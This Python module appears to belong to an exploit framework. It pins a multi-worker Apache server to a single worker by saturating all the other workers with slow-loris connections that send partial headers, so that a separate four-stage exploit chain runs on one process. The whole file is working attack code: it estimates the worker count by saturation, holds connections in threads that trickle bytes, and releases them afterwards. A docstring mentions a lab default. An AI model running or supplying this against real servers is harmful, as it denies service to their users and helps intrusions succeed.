"""Worker pinning by slow-loris saturation.

The exploit chain must run on the same worker (same PID) across all four
stages. On multi-worker Apache targets, we saturate every worker except
one with slow-loris connections, so the chain lands on the surviving
worker.

Strategy:
  1. Estimate MaxRequestWorkers by opening partial-header connections and
     probing when a new connection stops getting served.
  2. Open (N-1) partial-header connections that hold workers blocked on
     read.
  3. Run the exploit chain on the one remaining worker.
  4. Release the pinning connections at cleanup.

For single-worker targets (lab default), pinning is a no-op.
"""
from __future__ import annotations

import socket
import threading
import time
from dataclasses import dataclass

from .branding import log


@dataclass
class PinState:
    sockets: list[socket.socket]
    worker_count: int
    pinned: bool


def _slow_probe(host: str, port: int, path: str) -> socket.socket:
    """Open a socket holding a worker on a partial-header read."""
    s = socket.create_connection((host, port), timeout=10.0)
    s.settimeout(10.0)
    s.sendall(
        (f"GET {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         f"Connection: keep-alive\r\n"
         f"X-Slow: ").encode()
    )
    return s


def _quick_probe(host: str, port: int, path: str) -> bool:
    """Return True if the target responds within 1.5s."""
    try:
        s = socket.create_connection((host, port), timeout=1.5)
    except OSError:
        return False
    try:
        s.settimeout(1.5)
        s.sendall(
            (f"GET {path} HTTP/1.0\r\n"
             f"Host: {host}\r\n"
             f"Connection: close\r\n\r\n").encode()
        )
        return bool(s.recv(128))
    except OSError:
        return False
    finally:
        try:
            s.close()
        except OSError:
            pass


def estimate_workers(host: str, port: int, path: str = "/",
                     max_probe: int = 8) -> int:
    """Estimate MaxRequestWorkers by saturating with slow-loris probes."""
    held: list[socket.socket] = []
    last_ok = 0
    try:
        for n in range(1, max_probe + 1):
            try:
                held.append(_slow_probe(host, port, path))
            except OSError:
                break
            time.sleep(0.15)
            if _quick_probe(host, port, path):
                last_ok = n + 1
            else:
                break
    finally:
        for s in held:
            try:
                s.close()
            except OSError:
                pass
    result = max(1, last_ok)
    log.debug(f"estimate_workers → {result} (last_ok={last_ok})")
    return result


def _hold_worker(host: str, port: int, path: str, duration: float,
                 result_list: list, idx: int) -> None:
    """Thread target: hold a worker blocked on a partial-header read."""
    try:
        s = socket.create_connection((host, port), timeout=duration + 10)
        s.settimeout(duration + 10)
        s.sendall(
            (f"GET {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Connection: keep-alive\r\n"
             f"X-Slow: ").encode()
        )
        result_list[idx] = s

        end = time.monotonic() + duration
        while time.monotonic() < end:
            try:
                s.sendall(b"A")
                time.sleep(2.0)
            except OSError:
                break
    except OSError as exc:
        log.debug(f"hold_worker[{idx}] failed: {exc}")


def pin_workers(host: str, port: int, path: str = "/",
                worker_count: int = 0,
                hold_duration: float = 120.0) -> PinState:
    """Pin every worker except one. Returns PinState for release."""
    if worker_count == 0:
        worker_count = estimate_workers(host, port, path)

    log.field("estimated MaxRequestWorkers", worker_count)

    if worker_count <= 1:
        log.field("pin strategy", "not required (single worker)", status="")
        return PinState(sockets=[], worker_count=worker_count, pinned=False)

    pin_count = worker_count - 1
    log.field("pin strategy",
              f"slow-loris × {pin_count} (reserving 1 worker)")

    sockets: list[socket.socket | None] = [None] * pin_count
    threads = []
    for i in range(pin_count):
        t = threading.Thread(
            target=_hold_worker,
            args=(host, port, path, hold_duration, sockets, i),
            daemon=True,
        )
        t.start()
        threads.append(t)
        time.sleep(0.1)

    time.sleep(1.0)
    active = sum(1 for s in sockets if s is not None)
    log.field("workers pinned", f"{active}/{pin_count}",
              status="ok" if active == pin_count else "warn")

    if active < pin_count:
        log.warn("some workers not held — chain may land on a pinned worker")

    return PinState(
        sockets=[s for s in sockets if s is not None],
        worker_count=worker_count,
        pinned=active > 0,
    )


def release_pin(state: PinState) -> None:
    """Close all pinning connections."""
    closed = 0
    for s in state.sockets:
        try:
            s.close()
            closed += 1
        except OSError:
            pass
    if state.pinned:
        log.field("pins released", f"{closed}/{len(state.sockets)}")
    state.sockets.clear()
    state.pinned = False
